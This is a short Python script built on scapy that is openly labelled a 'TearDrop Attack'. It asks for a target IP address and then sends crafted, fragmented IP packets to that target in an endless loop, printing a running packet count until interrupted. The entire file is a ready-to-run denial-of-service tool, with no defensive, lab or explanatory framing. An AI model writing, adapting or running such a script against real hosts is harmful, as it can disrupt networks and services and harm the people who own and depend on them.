import scapy.all as scapy
import os


def TearDrop():

	clear = os.system('clear')

	print("**************************************")
	print("            TearDrop Attack")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[TearDrop Attack]#")
	num = 0


	try:
		while True:
			packet = scapy.IP(dst=target,flags=0,proto=17,frag=3)/("\x00"*100)
			packets = scapy.IP(dst=target,flags="MF",proto=17,frag=18)/("\x00"*150)
			
			num += 2
			scapy.send(packet,verbose=False)
			scapy.send(packets,verbose=False)
			print("[+]Sent "+str(num)+"packets")
	except KeyboardInterrupt:
		print("[-] Ctrl + C detected....")
	
TearDrop()
